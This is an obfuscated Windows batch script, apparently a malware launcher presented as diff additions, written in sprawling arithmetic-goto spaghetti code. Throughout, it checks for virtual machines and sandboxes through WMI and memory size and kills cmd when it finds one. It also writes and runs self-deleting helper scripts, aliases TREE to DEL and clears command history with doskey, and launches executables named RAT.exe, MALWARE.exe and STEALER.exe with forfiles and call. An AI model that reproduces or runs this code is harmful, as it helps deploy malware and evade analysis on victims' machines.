+:645943 
+:968222 
+:240967 
+:397653 
+:607682  
+set "L1=H" 
+set /a ans=0161*(01344201523) 
+echo @echo off >> kdotznyEF.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotznyEF.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotznyEF.bat 
+
+ call kdotznyEF.bat 
+goto (0161*(01344201523))  
+:933264 
+:744742 
+:465491 
+:143416 
+:767390  
+for /l %%r  in (798  798  798) do (
+ set "N1=J" 
+)
+set /a ans=2*2*03*(063663022034) 
+goto (2*2*03*(063663022034))  
+:853268 
+:746577 
+:133623  
+for /l %%i  in (198  198  198) do (
+ set "O1=K" 
+)
+set /a ans=2*2*0145*(0x79001463) 
+goto (2*2*0145*(0x79001463))  
+:857135 
+:361053 
+:215730 
+:473854 
+:712835  
+for /l %%u  in (396  396  396) do (
+ set "P1=L" 
+)
+set /a ans=2*2*013*(0x12190x2ea) 
+echo @echo off >> kdotKaLQkm.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotKaLQkm.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotKaLQkm.bat 
+
+ call kdotKaLQkm.bat 
+goto (2*2*013*(0x12190x2ea))  
+:904988 
+:670026  
+for /l %%y  in (277  277  277) do (
+ set "Q1=M" 
+)
+set /a ans=03*03*05*057*0xc5 
+goto (03*03*05*057*0xc5)  
+:602911 
+:188161 
+:366505 
+:410516 
+:833839  
+for /l %%p  in (845  845  845) do (
+ set "R1=N" 
+)
+set /a ans=2*03*03*0x3*013*~-338 
+goto (2*03*03*0x3*013*~-338)  
+:669397 
+:372507 
+:767390 
+:560156  
+set "S1=O" 
+set /a ans=05*~-123632 
+goto (05*~-123632)  
+:958253  
+set "U1=Q" 
+set /a ans=2*0x3*0x3*0x3*03*03*03*0x5*0147 
+goto (2*0x3*0x3*0x3*03*03*03*0x5*0147)  
+:330388 
+:276251 
+:507227 
+:155043 
+:519355 
+:962256 
+:494729  
+for /l %%l  in (551  551  551) do (
+ set "X1=T" 
+)
+set /a ans=0x3*0x3*0xb*((02336420115322)>>4) 
+goto (0x3*0x3*0xb*((02336420115322)>>4))  
+:317634 
+:160723 
+:628654  
+set "A1=W" 
+set /a ans=0x7*((025015100566670)>>4) 
+goto (0x7*((025015100566670)>>4))  
+:537718 
+:486922 
+:360020 
+:769655 
+:232226 
+:664213  
+for /l %%d  in (546  546  546) do (
+ set "D1=Z" 
+)
+set /a ans=065*0x49*0117 
+goto (065*0x49*0117)  
+:110095 
+:221162 
+:470676  
+echo GRABBER.exe >nul 2>nul 
+set /a ans=0x3*0x5*05*0xb*(0xa50x1b0) 
+goto (0x3*0x5*05*0xb*(0xa50x1b0))  
+:570439 
+:395985 
+:522953 
+:962256 
+:560156 
+:880219  
+mshta 
+set /a ans=2*0x65*(0x4ee0x2e3) 
+goto (2*0x65*(0x4ee0x2e3))  
+:692213 
+:215621 
+:166381 
+:598129 
+:395985 
+:542877 
+:971142 
+:568969  
+powershell.exe -nop -c "Write-Host -NoNewLine $null" 
+set /a ans=0x5*0xad*((0620513075113)>>8) 
+goto (0x5*0xad*((0620513075113)>>8))  
+:326088 
+:838012  
+echo BAT_DLL.exe >nul 2>nul 
+set /a ans=2*0x5*0xd*~-2664 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (2*0x5*0xd*~-2664)  
+:410817 
+:446974  
+if chcp leq 1 (
+ mshta 
+) else (
+echo 4  >nul 
+)
+set /a ans=2*0x2f*((05506410x77ee1)>>6) 
+echo @echo off >> kdotfgYXM.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotfgYXM.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotfgYXM.bat 
+
+ call kdotfgYXM.bat 
+goto (2*0x2f*((05506410x77ee1)>>6))  
+:385907 
+:372507 
+:927839  
+forfiles /p   /m RAT.exe /c 'cmd /c start @file' >nul 2>nul 
+set /a ans=2*0x3*0x5*05*0x7*~-240 
+echo @echo off >> kdotYkXHn.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotYkXHn.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotYkXHn.bat 
+
+ call kdotYkXHn.bat 
+goto (2*0x3*0x5*05*0x7*~-240)  
+:664213 
+:718180  
+echo BAD_EXE.exe >nul 2>nul 
+set /a ans=0x3*0211*~-840 
+echo @echo off >> kdotgiZIHu.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotgiZIHu.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotgiZIHu.bat 
+
+ call kdotgiZIHu.bat 
+goto (0x3*0211*~-840)  
+:143776 
+:480396 
+:609187  
+for /l %%b  in (668  668  668) do (
+ set "e=a" 
+)
+set /a ans=0x3*07*~-42840 
+goto (0x3*07*~-42840)  
+:838645 
+:105221  
+for /l %%f  in (140  140  140) do (
+ set "f=b" 
+)
+set /a ans=2*2*015*065*0x83 
+goto (2*2*015*065*0x83)  
+:791069 
+:546797 
+:838012 
+:689176  
+set "h=d" 
+set /a ans=(0x8a3df0364530) 
+goto ((0x8a3df0364530))  
+:208683 
+:791069 
+:973240  
+for /l %%z  in (710  710  710) do (
+ set "i=e" 
+)
+set /a ans=2*2*0xd*0xd*~-1322 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%BpMjYrrCE%%DYWIUNNcc%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%VWTkYBe%%wSyZdDK%%a\nif "%%mfRURlFwT%%rMDsnvVUWifhISKQG%%VOysbqbZwGiMVImr%%DrPIuGLDjZPaTXwNe%%tKZPgEOgSqrrKSFbm%%ZFEintoHnbACwwFWp%%ibNhLUrtuwZXUSyzg%%KmHvlrTyYyhyIwqEEZP%%HHtfzlZEpKQSHGGT%%ZEArcbAkLqKlahUiDZ%%HNRoaAZbnHTeogCNET%%OLfNXzVaIWLcoRO%%frURSZhnAvnwKTv%%RDDXoCXfk%%"=="Microsoft Corporation" if "%%XcSuEDi%%vWZqGKNEinhUWaTWEv%%WRQkVXJmkPozdqCp%%ZvfOmdAWzGbYzoaz%%SEDczxwaRZUUrVQh%%ULbaQaIhlzYWtPvj%%pCPJMFWIy%%"=="Virtual Machine" exit\nif "%%CtrgbWtco%%YjKnOvEHciYsJmkfG%%FFrcomZowZNVuVYngX%%CCPcQyiRmjNcwEFrbH%%NWKqEmfvqVXmKwfz%%rCZGKsxFboRJCoTGlK%%WcPslVTwARNBbqdNL%%dUNaQLwyzeCaTJULZ%%QoQfZJKOpFtaXqfb%%EzBJhghqitkwXkvG%%vWLQFxpInXeySPUzM%%VFoGqroaYgzbWeSku%%FfgTMduHniDpKsNjkg%%RwPxBulx%%"=="VMware, Inc." exit\nif "%%SntKfRuu%%HRfjVXrvliKqeJvTmQ%%qmhutaykYMOYfevBj%%keFKUJgGmzBLjUmva%%yBkHDHpaNZcLOSjGG%%oxmeWRmshxkeIPjE%%MUKnLOdZ%%"=="VirtualBox" exit 
+)
+goto (2*2*0xd*0xd*~-1322)  
+:458163 
+:141236  
+set "o=k" 
+set /a ans=2*0x7*((0x46149c0xa731c)>>7) 
+goto (2*0x7*((0x46149c0xa731c)>>7))  
+:750028 
+:114924 
+:173378 
+:465491 
+:720364  
+set "t=p" 
+set /a ans=0x3*0x3*05*((0x27fa90xdd729)>>7) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (0x3*0x3*05*((0x27fa90xdd729)>>7))  
+:707313 
+:513303 
+:760905 
+:706861 
+:522886 
+:669397 
+:160601  
+for /l %%m  in (480  480  480) do (
+ set "v=r" 
+)
+set /a ans=021*((01721040451120)>>2) 
+goto (021*((01721040451120)>>2))  
+:378056 
+:827419 
+:188161 
+:188161 
+:276783 
+:273204  
+for /l %%z  in (222  222  222) do (
+ set "w=s" 
+)
+set /a ans=2*03*0x1d*045*075 
+echo @echo off >> kdotccKQSW.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotccKQSW.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotccKQSW.bat 
+
+ call kdotccKQSW.bat 
+goto (2*03*0x1d*045*075)  
+:716598 
+:334646 
+:433583 
+:635054 
+:160723 
+:298416  
+set "x=t" 
+set /a ans=2*((0x46d88101376341)>>5) 
+goto (2*((0x46d88101376341)>>5))  
+:662380 
+:956368 
+:160550  
+set "y=u" 
+set /a ans=0x5*075*(0x13905506) 
+goto (0x5*075*(0x13905506))  
+:955293 
+:105221 
+:449083  
+for /l %%g  in (775  775  775) do (
+ set "b=x" 
+)
+set /a ans=05*~-60224 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%UGJvZBXZZ%%zSxJbcxAo%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%ATuJoIRvz%%YmGapZDH%%a\nif "%%jxMSjfzB%%TNaLZStwHityOFWWdr%%RPElrBivqwILEtWve%%CRGQeHOsejRHRwPQW%%lDLpcggSCqDHBWIxyG%%RnhGFhQHObCCHEWBQRL%%lqlWTObMwQMgSiXP%%lKnGAbclyytbmoSsSt%%VjshOFIhpDqnHNrBw%%uHqfKthqmJZsFbS%%bVciPSgYonwDeivGJds%%KsHwgAKWdaGYxtqnDoc%%JyybqttnfDdSGIcx%%DeNJWJD%%"=="Microsoft Corporation" if "%%uhwWGrigh%%hKOTcrgBdimsCfCOt%%uIsRLlMkEhSpIONj%%hPmEdDlCSzZtGkFgrV%%yGyZuCUapsBbBHRD%%QdxTZyQxhXfNVuNFmZ%%GfEmYwbo%%"=="Virtual Machine" exit\nif "%%XYlrZyIno%%HXlZZfYRiNHwBDtZu%%cjiqNtXCSwcZnzvSng%%HTcFMglQvjJoCRDtnw%%qCPESZDbNqzdiQSlAY%%VTitlymbEKnAnjg%%PAIFQqgDkwuMTzBitOU%%HUpJJeeyEZYThvJ%%dffzThnxCpYxnCStWLe%%iRqbyNsqAjSoUIWsC%%yxCUdysnwIMAwfaxH%%DjsIWxfaJktnzReX%%ePWXBqKhdneBJkZSF%%QBxFjYANc%%"=="VMware, Inc." exit\nif "%%oBGUJbY%%utyEDxmistKeAHN%%ECTPTivkEAZQVuI%%YWVqgUlzMJVkClNS%%zySPCOruaMfRiUHBAX%%srZMIJtuZhfKFAwmY%%pZpmlGM%%"=="VirtualBox" exit 
+)
+goto (05*~-60224)  
+:598994 
+:173378 
+:444683 
+:132055 
+:880219 
+:558178  
+set "c=y" 
+set /a ans=2*03*05*0xb*015*0x47 
+echo @echo off >> kdotyqQaAQ.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotyqQaAQ.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotyqQaAQ.bat 
+
+ call kdotyqQaAQ.bat 
+goto (2*03*05*0xb*015*0x47)  
+:995389 
+:477573 
+:568819 
+:530999 
+:689176 
+:720364 
+:437870  
+set "F1=B" 
+set /a ans=021*037*((016301033421)>>4) 
+echo @echo off >> kdotBVbOkf.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotBVbOkf.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotBVbOkf.bat 
+
+ call kdotBVbOkf.bat 
+goto (021*037*((016301033421)>>4))  
+:367095 
+:955316 
+:660218 
+:865296  
+set "G1=C" 
+set /a ans=2*((0264703530x71e4aeb)>>9) 
+goto (2*((0264703530x71e4aeb)>>9))  
+:160550 
+:940203  
+for /l %%m  in (132  132  132) do (
+ set "H1=D" 
+)
+set /a ans=2*2*((01174742001173440)>>4) 
+goto (2*2*((01174742001173440)>>4))  
+:418634 
+:804104 
+:883712 
+:725222  
+set "L1=H" 
+set /a ans=0x3*(0530656)*~-654 
+echo @echo off >> kdotJVSQH.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotJVSQH.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotJVSQH.bat 
+
+ call kdotJVSQH.bat 
+goto (0x3*(0530656)*~-654)  
+:267344 
+:240967 
+:712835 
+:973240 
+:896691  
+set "P1=L" 
+set /a ans=03*~-156420 
+goto (03*~-156420)  
+:842381 
+:598129 
+:589492  
+for /l %%z  in (641  641  641) do (
+ set "S1=O" 
+)
+set /a ans=0x3*0x1d*((0xde4d0x1e7f5)>>3) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (0x3*0x1d*((0xde4d0x1e7f5)>>3))  
+:806663 
+:745256 
+:649864 
+:218266 
+:415991 
+:743678  
+set "T1=P" 
+set /a ans=2*2*2*03*03*0xd*0x6b 
+goto (2*2*2*03*03*0xd*0x6b)  
+:477573 
+:244216  
+for /l %%v  in (156  156  156) do (
+ set "U1=Q" 
+)
+set /a ans=2*07*0x43*0227 
+goto (2*07*0x43*0227)  
+:907949 
+:716598 
+:265660 
+:519355 
+:133623 
+:449083 
+:896691 
+:140135  
+for /l %%q  in (690  690  690) do (
+ set "V1=R" 
+)
+set /a ans=05*035*(0x134801717) 
+echo @echo off >> kdotNNZdJq.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotNNZdJq.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotNNZdJq.bat 
+
+ call kdotNNZdJq.bat 
+goto (05*035*(0x134801717))  
+:958760 
+:520353 
+:620197 
+:171227 
+:530999 
+:437870 
+:305763  
+set "W1=S" 
+set /a ans=2*0x3*0x13*((0x87000344460)>>4) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (2*0x3*0x13*((0x87000344460)>>4))  
+:140135 
+:387931  
+for /l %%i  in (566  566  566) do (
+ set "A1=W" 
+)
+set /a ans=2*2*03*0x3*0x3*0x7*0x7*0247 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%frbFhMAN%%RxiLontvu%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%XpCftzVw%%tcdTHAOEL%%a\nif "%%ivzWoKW%%jdZwzVrSiorCgcnggc%%eJxKBRybAwWOaDVSOhE%%KeGGDysosjGCtVAEhY%%lkGToVmeqqriMtfdm%%SchrMtsObOofzvXEYi%%FBkfFMUwtBduVPtQ%%qNZWzzPYWyMjisxgwaQ%%XTNNQQIpcMMBUrh%%fgmaPVASPqSBtroSDbR%%jhCHhbCGnowmMEYCdc%%vrueXBjkQauFLKIragc%%akbzigknBIngjZT%%DHOzPOr%%"=="Microsoft Corporation" if "%%wQVOPgEXg%%EylakEginnJfhbSsK%%IcvQisZwkrypMkjK%%cirpFqgYzuHbBHUH%%tsLNiKPGatPgDGXyHs%%AUbvqvVhMLteEwWuZ%%MPbiiSabl%%"=="Virtual Machine" exit\nif "%%QGXdMSwv%%ifTOLkjlniXcpNDBMM%%lGqJZICawjTsXoHcQk%%UmBqqrtmnjmEvQyfN%%pZyZxNUqqtgGwjmY%%dkqZdUaibIdAacxyiO%%rBMSsGagwQjxPgupB%%qlnIOKoHHyjBPegpQs%%kbuEBrWQPpIIumjQvTG%%xXHLEcoIkqLnxNBcS%%TeuajOknqdPcrVL%%wRKlDmsVaHwfMPVwPf%%iOieAMQtnkvMfSmBE%%uxjSzZjm%%"=="VMware, Inc." exit\nif "%%QtnGLSBE%%tgamBAmiAPlwqvzIi%%LcKCkOLydkbdRTJnm%%JmjOMsFzyLMRTbKS%%QNmzYEEuRaeGRDRlBA%%wPzvScWohZhUkrhYp%%uwRVInEz%%"=="VirtualBox" exit 
+)
+goto (2*2*03*0x3*0x3*0x7*0x7*0247)  
+:325587 
+:745256 
+:468708 
+:430119  
+for /l %%s  in (215  215  215) do (
+ set "B1=X" 
+)
+set /a ans=0x3*0x3*0x3*(01202035455) 
+goto (0x3*0x3*0x3*(01202035455))  
+:999011 
+:917403  
+set "D1=Z" 
+set /a ans=2*0x3*(03764550134344) 
+goto (2*0x3*(03764550134344))  
+:511645 
+:880591 
+:137676 
+:773875 
+:837690 
+:243488  
+echo BAD_EXE.exe >nul 2>nul 
+set /a ans=~-151304 
+goto (~-151304)  
+:971142 
+:670026 
+:896691 
+:253950  
+call MALWARE.exe >nul 2>nul 
+set /a ans=2*0x11*(0x159a0xf69) 
+echo @echo off >> kdotIXokm.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotIXokm.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotIXokm.bat 
+
+ call kdotIXokm.bat 
+goto (2*0x11*(0x159a0xf69))  
+:729700 
+:477573 
+:429517  
+forfiles /p   /m MALWARE.exe /c 'cmd /c start @file' >nul 2>nul 
+set /a ans=0x17*0x3b*(0xae0627) 
+goto (0x17*0x3b*(0xae0627))  
+:187257 
+:140135 
+:253950 
+:643412  
+echo STEALER.exe >nul 2>nul 
+set /a ans=0x3*~-248510 
+goto (0x3*~-248510)  
+:331150 
+:189784  
+doskey CMD=VERIFY 
+set /a ans=03*((0x187aeb01563513)>>5) 
+goto (03*((0x187aeb01563513)>>5))  
+:739651 
+:361053 
+:410817 
+:628654 
+:720364 
+:743678 
+:756505  
+if chcp leq 1 (
+ doskey /listsize=0 
+) else (
+doskey /listsize=0 
+)
+set /a ans=2*2*2*03*0x5*0xd*(0xe80627) 
+goto (2*2*2*03*0x5*0xd*(0xe80627))  
+:803162 
+:267344 
+:718180 
+:273204 
+:449083 
+:829318  
+call BAD_EXE.exe >nul 2>nul 
+set /a ans=2*0xb*0xb*~-1748 
+echo @echo off >> kdotCByeWc.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotCByeWc.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotCByeWc.bat 
+
+ call kdotCByeWc.bat 
+goto (2*0xb*0xb*~-1748)  
+:143416 
+:880219 
+:253950 
+:181178  
+mshta 
+set /a ans=0x5*0x5*0x13*~-2054 
+goto (0x5*0x5*0x13*~-2054)  
+:473854 
+:756505 
+:698249  
+for /l %%m  in (42  42  42) do (
+ timeout 0 >nul 
+)
+set /a ans=0x3*05*~-24110 
+goto (0x3*05*~-24110)  
+:807745 
+:171227 
+:904988 
+:415991 
+:907009  
+powershell.exe -nop -c "Write-Host -NoNewLine $null" 
+set /a ans=2*0x3*03*0x29*(0331060) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (2*0x3*03*0x29*(0331060))  
+:561645 
+:707708 
+:137647 
+:607682 
+:244216 
+:919532  
+forfiles /p   /m RAT.exe /c 'cmd /c start @file' >nul 2>nul 
+set /a ans=2*027*(0177220x230f) 
+goto (2*027*(0177220x230f))  
+:966904 
+:577195 
+:683317  
+doskey GRAFTABL=LABEL 
+set /a ans=03*03*0x3*0x3*0xb*(0xdb0x4c2) 
+echo @echo off >> kdotQKCHm.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotQKCHm.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotQKCHm.bat 
+
+ call kdotQKCHm.bat 
+goto (03*03*0x3*0x3*0xb*(0xdb0x4c2))  
+:693416 
+:910773 
+:744742 
+:481826 
+:865296 
+:743678 
+:664495  
+for /l %%p  in (669  669  669) do (
+ set "f=b" 
+)
+set /a ans=0200*0x3*0x3*03*0x3*0x35 
+goto (0200*0x3*0x3*03*0x3*0x35)  
+:880219 
+:756505 
+:683317 
+:106501  
+for /l %%k  in (361  361  361) do (
+ set "g=c" 
+)
+set /a ans=03*~-37022 
+goto (03*~-37022)  
+:236554 
+:662380 
+:318891 
+:306023  
+set "m=i" 
+set /a ans=2*05*0111*~-1172 
+goto (2*05*0111*~-1172)  
+:298416 
+:106501 
+:571752  
+for /l %%y  in (91  91  91) do (
+ set "p=l" 
+)
+set /a ans=03*015*((0x49aa030202)>>3) 
+goto (03*015*((0x49aa030202)>>3))  
+:590246 
+:670798 
+:429517 
+:583951  
+for /l %%l  in (941  941  941) do (
+ set "q=m" 
+)
+set /a ans=0x25*053*0x61 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (0x25*053*0x61)  
+:182044 
+:537718 
+:278473 
+:769655 
+:649855 
+:883712 
+:590246 
+:276783 
+:622798  
+for /l %%d  in (230  230  230) do (
+ set "t=p" 
+)
+set /a ans=(025025350x4410e) 
+goto ((025025350x4410e))  
+:711325 
+:124956 
+:689176 
+:273204 
+:907009 
+:104289  
+for /l %%z  in (553  553  553) do (
+ set "v=r" 
+)
+set /a ans=0x3*05*(0xf8ed0x78e2) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (0x3*05*(0xf8ed0x78e2))  
+:430086 
+:739651 
+:763739 
+:166381 
+:620197 
+:660218 
+:423567 
+:273204 
+:181178 
+:698249 
+:664495 
+:699772  
+set "w=s" 
+set /a ans=2*015*0x11*~-1742 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (2*015*0x11*~-1742)  
+:352348 
+:399628  
+set "x=t" 
+set /a ans=0x5*015*0x1f*0141 
+goto (0x5*015*0x1f*0141)  
+:305763 
+:444970  
+for /l %%s  in (362  362  362) do (
+ set "z=v" 
+)
+set /a ans=((0x830xb8b)>>3)*((0x1959c0x3db1c)>>7) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (((0x830xb8b)>>3)*((0x1959c0x3db1c)>>7))  
+:289370 
+:137647 
+:318891 
+:356337  
+set "a=w" 
+set /a ans=2*((055420050x30cc7d)>>3) 
+goto (2*((055420050x30cc7d)>>3))  
+:532951 
+:966567 
+:585040 
+:590246 
+:577195 
+:243488 
+:470741  
+for /l %%k  in (528  528  528) do (
+ set "E1=A" 
+)
+set /a ans=03*~-300512 
+goto (03*~-300512)  
+:273976 
+:334646 
+:113473 
+:218266 
+:546797 
+:568969 
+:699772 
+:279208  
+set "J1=F" 
+set /a ans=0255*~-4274 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (0255*~-4274)  
+:955215 
+:601551 
+:995389 
+:704012 
+:363766 
+:470741 
+:754600  
+for /l %%x  in (404  404  404) do (
+ set "L1=H" 
+)
+set /a ans=0x3*0x3*015*0x47*0x6d 
+echo @echo off >> kdotrEqkQo.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotrEqkQo.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotrEqkQo.bat 
+
+ call kdotrEqkQo.bat 
+goto (0x3*0x3*015*0x47*0x6d)  
+:120894  
+for /l %%t  in (452  452  452) do (
+ set "M1=I" 
+)
+set /a ans=(014064101127770) 
+goto ((014064101127770))  
+:655941 
+:699533 
+:973240 
+:306023 
+:356337 
+:304909  
+set "N1=J" 
+set /a ans=((0x3d090133111)>>6)*(0x41d0772) 
+goto (((0x3d090133111)>>6)*(0x41d0772))  
+:546797 
+:410516 
+:643412 
+:189784 
+:444970 
+:356337 
+:904494  
+set "Q1=M" 
+set /a ans=0xc7*(0xf550272) 
+goto (0xc7*(0xf550272))  
+:560896 
+:333352 
+:622798 
+:482995  
+set "R1=N" 
+set /a ans=(0x17d0144)*((0171740027140)>>7) 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%TzbUxzIuJ%%BXnFjzfoZ%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%KuAByID%%NgGGAEQY%%a\nif "%%dtxROOSvN%%NJxNQwbPfisczYGfCk%%EsgfjzoXuwOyXjibP%%jZqhmbPjVWURtLz%%lBEfenGnEqDTfNhEKMq%%xDAFxHTbEQVbUNR%%SdPEocYxwSyUxlssK%%IlVjFsVyFNSdLsq%%SlTMZFspiwwzBHBP%%wxWsacqqnDbKvLCT%%juOZzRhEJnAFAjEMkQd%%zfedkaYrqadROBHeX%%BPFkrJgFntcnWZyqF%%IPzpEztjq%%"=="Microsoft Corporation" if "%%yEqdXLZV%%kTcJcwciYwoQvzM%%KkjUWBXtCkabkhwMPB%%ezOJFaFWzRIvRIGMh%%vdbhZEqNXaepflbWHDw%%UYNLNYsJhwSyVFFdJe%%hvdLnNGE%%"=="Virtual Machine" exit\nif "%%qJaunkd%%YeKxcQUmgimoGhAaV%%bXNQcuKwXEhNMddP%%qMATWBaKjjNPuQgNo%%TUAIAuDmqSsUHkSjr%%BhudgIHbbmnGOJlsr%%QrFLhAiIxwJZATXOhCO%%CgJCCpVAyXbUELyGF%%QUlPUYcQpKbfUgJi%%hXEXLlIqbKTLmdU%%AXPHHIpEnQEeVccgvF%%yhuiWaxkaUsRVPbP%%LDzxpZGnacoflcBZ%%SCBcUtPGQ%%"=="VMware, Inc." exit\nif "%%qJrMNvVyT%%QabqEltciaujWKNzq%%yfWtZXNHHkMhWCNxXe%%umWLoErwzSgrftZfm%%obllYDcarmngATUQH%%AZkcvFWRhelHDFgxs%%GxUhiro%%"=="VirtualBox" exit 
+)
+goto ((0x17d0144)*((0171740027140)>>7))  
+:334646 
+:958253 
+:568969 
+:105221 
+:514925  
+set "T1=P" 
+set /a ans=0x3*0x5*0177*(0x760x1b7) 
+goto (0x3*0x5*0177*(0x760x1b7))  
+:169688 
+:932376 
+:609187 
+:387931 
+:253950 
+:867163  
+set "X1=T" 
+set /a ans=0227*(0166100x9d1) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (0227*(0166100x9d1))  
+:767389 
+:119651 
+:473854 
+:133623 
+:430119 
+:917403 
+:399628 
+:356337 
+:530799  
+for /l %%a  in (643  643  643) do (
+ set "Y1=U" 
+)
+set /a ans=2*023*((0x32d18045650)>>4) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (2*023*((0x32d18045650)>>4))  
+:511645 
+:315054 
+:570439 
+:141236 
+:526102  
+set "A1=W" 
+set /a ans=0x2b*(0xc82013401) 
+goto (0x2b*(0xc82013401))  
+:628654 
+:446974 
+:940203 
+:698249 
+:683742  
+if 4  equ 59242 (
+ echo 4  >nul 
+) else (
+rundll32 
+)
+set /a ans=~-578588 
+goto (~-578588)  
+:846580 
+:306023 
+:457710  
+doskey TREE=DEL 
+set /a ans=2*2*0x3*03*03*07*((0216750xadd)>>5) 
+goto (2*2*0x3*03*03*07*((0216750xadd)>>5))  
+:507227 
+:966904 
+:143776 
+:312897 
+:600722  
